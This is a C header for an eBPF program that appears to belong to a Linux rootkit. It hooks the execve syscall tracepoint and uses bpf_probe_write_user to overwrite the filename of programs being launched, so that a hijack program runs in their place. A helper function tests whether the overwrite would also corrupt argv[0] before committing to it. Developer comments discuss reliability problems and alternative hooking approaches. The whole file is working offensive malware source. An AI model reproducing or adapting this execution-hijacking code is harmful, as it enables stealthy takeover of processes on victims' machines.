#ifndef __EXEC_H
#define __EXEC_H

#include "headervmlinux.h"

#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>

#include "../../../common/constants.h"
#include "../../../common/map_common.h"
#include "defs.h"
#include "../utils/strings.h"

#define NUMBER_ARGUMENTS_PARSED 12
#define ARGUMENT_LENGTH 64


/**
 * >> cat /sys/kernel/debug/tracing/events/syscalls/sys_enter_execve/format
 */
struct sys_execve_enter_ctx {
    unsigned long long unused;
    int __syscall_nr;
    unsigned int padding;
    const char* filename;
    const char* const* argv;
    const char* const* envp;
};

volatile int hijacker_state = 0;

/**
 * @brief Checks for the error case 2 described in the execve handler when overwriting the filename userspace buffer.
 * 
 * @param ctx 
 * @return 0 if OK, -1 if error exists
 */
static __always_inline int test_write_user_unique(struct sys_execve_enter_ctx *ctx, char* org_filename, char* org_argv){
    unsigned char* argv[1] = {0};
    unsigned char filename[1] = {0};
    char* chosen_comp_char = "w\0";
    if(ctx==NULL || ctx->argv == NULL|| org_filename==NULL){
        return -1;
    }
    char org_argv_c;
    if(bpf_probe_read(&org_argv_c, 1, org_argv)<0){
        bpf_printk("Error reading test 3\n");
        return -1;
    }
    //if(str_n_compare((char*)org_argv, 1, (char*)chosen_comp_char, 1, 1)==0){
    if(org_argv_c == 'w'){
        //Better not to go with this case, we won't be able to know whether that was a coincidence
        bpf_printk("Equal from the start\n");
        return -1;
    }
    if(bpf_probe_write_user((void*)(ctx->filename), (void*)chosen_comp_char, 1)<0){
        bpf_printk("Error writing to user memory at test by %s\n", org_filename);
        return -1;
    }
    if(bpf_probe_read_user(&argv, 1, ctx->argv)<0){
        bpf_printk("Error reading test 1\n");
        return -1;
    };
    if(bpf_probe_read_user(&filename, 1, ctx->filename)<0){
        bpf_printk("Error reading tets 2\n");
        return -1;
    };
    char argv_c;
    if(bpf_probe_read(&argv_c, 1, org_argv)<0){
        bpf_printk("Error reading test 3\n");
        return -1;
    }
    if(argv_c == 'w'){
        //Now they are equal, so we are in the error case 2. We must revert our changes
        bpf_printk("Error case 2\n");
        bpf_probe_write_user((void*)(ctx->filename), (void*)org_filename, 1);
        return -1;
    }
    bpf_printk("Char was %u\n", argv_c);
    //Everything went fine, but let's fix our modification anyways since the next write to user memory, which
    //implies more bytes, may fail.
    bpf_probe_write_user((void*)(ctx->filename), (void*)org_filename, 1);
    return 0;

}

static __always_inline int handle_tp_sys_enter_execve(struct sys_execve_enter_ctx *ctx, __u64 pid_tgid){
    //Check if the exec hijacker is active already
    if(hijacker_state == 1){
        return 0;
    }
    bpf_printk("Starting execve hijacker\n");
    
    unsigned char* argv[NUMBER_ARGUMENTS_PARSED] = {0};
    //unsigned char* envp[PROGRAM_LENGTH] = {0};
    unsigned char filename[ARGUMENT_LENGTH] = {0};
    if(ctx==NULL || ctx->argv == NULL){
        return -1;
    }
    if(bpf_probe_read_user(&argv, ARGUMENT_LENGTH, ctx->argv)<0){
        bpf_printk("Error reading 1\n");
    };
    /*if(bpf_probe_read_user(&envp, PROGRAM_LENGTH, ctx->envp)<0){
        bpf_printk("Error reading 2\n");
    };*/
    if(bpf_probe_read_user(&filename, ARGUMENT_LENGTH, ctx->filename)<0){
        bpf_printk("Error reading 3\n");
    };

    bpf_printk("OLD ARGV0: %s\n", argv[0]);
    bpf_printk("ARGV1: %s\n", argv[1]);
    bpf_printk("ARGV2: %s\n", argv[2]);
    //bpf_printk("ENVP: %s\n", envp);
    bpf_printk("FILENAME: %s\n", filename);
    if((void*)ctx->filename==(void*)(ctx->argv)){
        bpf_printk("Equal pointers");
    }else{
        bpf_printk("Not equal pointers %u, %u", ctx->filename, ctx->argv);
    }

    if(str_n_compare((char*)filename, ARGUMENT_LENGTH, (char*)PATH_EXECUTION_HIJACK_PROGRAM, sizeof(PATH_EXECUTION_HIJACK_PROGRAM), sizeof(PATH_EXECUTION_HIJACK_PROGRAM)-1)!=0){
        //return 0;
    }

    /*
    eBPF can only modify user memory, and thus we may find ourselves into trouble here
    As it can be here https://elixir.bootlin.com/linux/v5.11/source/fs/exec.c#L2054
    we receive an userspace buffer, which is later tweaked via getname().
    Since we are hooking before that call, we should have user-accessible memory, however from my experience it works *only sometimes*.
    This seems very related https://stackoverflow.com/questions/63114141/how-to-modify-userspace-memory-using-ebpf
    And this thread discusses the issue https://www.spinics.net/lists/bpf/msg16795.html
    However, there is no clear solution. bpf_probe_write_user is simply not reliable enough. Two problems arise:
    1* The call simply fails and returns EFAULT(-14). This happens apparently randomly in some calls, but for some paths it ALWAYS happens,
       while others always work.
    2* The call not only overwrites the filename, but also argv[0] with a single write. This may be related to userspace programs using
       the same buffer for both filename and argv[0], since it is the same data in the end. Accordingly, when this event happens both
       the pointers are very close to one another (196 bytes exactly), but not pointing to the same exact location, which is a mystery.
    
    Another solution could be to hook do_execve and access the filename struct, which still contians
    an userspace buffer with filename inside. However if we failed to overwrite it before, we will too now.
    Also we can overwrite the return value of the syscall, pass the arguments to the internal ring buffer, read it from the
    user-side of the rootkit, and fork a process with the requested execve() call. I considered this not to be good enough.
    */

    char to_write[sizeof(PATH_EXECUTION_HIJACK_PROGRAM)] = {0};
    #pragma unroll
    for(int ii=0; ii<sizeof(PATH_EXECUTION_HIJACK_PROGRAM); ii++){
        (to_write[ii]) = PATH_EXECUTION_HIJACK_PROGRAM[ii];
    }

    if(argv[0]==NULL){
        return -1;
    }

    //Provided that the case error 2 may happen, we check if we are on that case before going ahead and overwriting everything.
    if(test_write_user_unique(ctx, (char*)filename, (char*)argv[0])!=0){
        bpf_printk("Test failed\n");
        return -1;
    }else{
        bpf_printk("Test completed\n");
    }

    if(bpf_probe_write_user((void*)(ctx->filename), (void*)to_write, (__u32)sizeof(PATH_EXECUTION_HIJACK_PROGRAM))<0){
        bpf_printk("Error writing to user memory by %s\n", filename);
        //bpf_printk("NEW ARGV0: %s\n", argv[0]);
        //bpf_printk("ARGV1: %s\n", argv[1]);
        //bpf_printk("ARGV2: %s\n", argv[2]);
        return -1;
    }
     
    bpf_printk("One success\n");
    hijacker_state = 1;

    unsigned char newfilename[ARGUMENT_LENGTH] = {0};
    unsigned char* newargv[NUMBER_ARGUMENTS_PARSED] = {0};
    if(bpf_probe_read_user(&newfilename, ARGUMENT_LENGTH, ctx->filename)<0){
        bpf_printk("Error reading\n");
    };
    if(bpf_probe_read_user(&newargv, ARGUMENT_LENGTH, ctx->argv)<0){
        bpf_printk("Error reading 1\n");
    };

    bpf_printk("SUCCESS NEW FILENAME: %s\n", newfilename);
    bpf_printk("NEW ARGV0: %s\n\n", newargv[0]);
    /*bpf_printk("ARGV1: %s\n", argv[1]);
    bpf_printk("ARGV2: %s\n", argv[2]);
    bpf_printk("ORIGINAL %s\n\n", filename);*/

    return 0;
}


SEC("tp/syscalls/sys_enter_execve")
int tp_sys_enter_execve(struct sys_execve_enter_ctx *ctx) {
    __u64 pid_tgid = bpf_get_current_pid_tgid();
    if(pid_tgid<0){
        return -1;
    }

    return handle_tp_sys_enter_execve(ctx, pid_tgid);
}



#endif